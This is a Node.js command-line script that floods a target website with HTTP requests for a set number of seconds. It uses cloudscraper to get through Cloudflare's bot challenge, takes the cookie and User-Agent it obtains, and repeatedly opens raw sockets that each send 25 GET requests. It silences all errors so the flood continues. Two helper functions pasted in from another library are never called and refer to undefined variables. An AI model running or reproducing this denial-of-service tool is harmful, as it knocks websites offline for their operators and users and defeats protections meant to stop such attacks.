const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

var cloudscraper = require('cloudscraper');
const url = require('url');
if (process.argv.length <= 2) {
    console.log(` [TARGET] [TIME] `);
	process.exit(-1);
}
var target = process.argv[2];
var time = process.argv[3];
var cookie = "";
var UserAgent = readLines("ua.txt");
var host = url.parse(target).host;
cloudscraper.get(target, function (error, response) {
	if (error) {
	} else {
		var parsed = JSON.parse(JSON.stringify(response));
		cookie = (parsed["request"]["headers"]["cookie"]);
		if (cookie == undefined) {
			cookie = (parsed["headers"]["set-cookie"]);
		}
		UserAgent = (parsed["request"]["headers"]["User-Agent"]);
	}
});
var counter = 0;

function setCookieAndReload(response, body, options, callback) {
  var challenge = body.match(/S='([^']+)'/);
  var makeRequest = requestMethod(options.method);

  if (!challenge) {
    return callback({errorType: 3, error: 'I cant extract cookie generation code from page'}, response, body);
  }

  var base64EncodedCode = challenge[1];
  var cookieSettingCode = new Buffer(base64EncodedCode, 'base64').toString('ascii');

  var sandbox = {
    location: {
      reload: function() {}
    },
    document: {}
  };

  vm.runInNewContext(cookieSettingCode, sandbox);

  try {
    jar.setCookie(sandbox.document.cookie, response.request.uri.href, {ignoreError: true});
  } catch (err) {
    return callback({errorType: 3, error: 'Error occurred during evaluation: ' +  err.message}, response, body);
  }

  options.challengesToSolve = options.challengesToSolve - 1;

  makeRequest(options, function(error, response, body) {
    processRequestResponse(options, {error: error, response: response, body: body}, callback);
  });
}

function checkForErrors(error, body) {
  var match;

  if(error) {
    return { errorType: 0, error: error };
  }

  if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
    return { errorType: 1 };
  }

  match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

  if (match) {
    return { errorType: 2, error: parseInt(match[1]) };
  }

  return false;
}

var int = setInterval(() => {
	if (cookie !== '' && UserAgent !== '') {
		var s = require('net').Socket();
		s.connect(80, host);
		s.setTimeout(5000);
		for (var i = 0; i < 25; i++) {
			s.write('GET ' + target + '/ HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + UserAgent + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		}
		s.on('data', function () {
			setTimeout(function () {
				s.destroy();
				return delete s;
			}, 2500);
		})
	}
});
setTimeout(() => clearInterval(int), time * 1000);

process.on('uncaughtException', function (err) {
});

process.on('unhandledRejection', function (err) {
});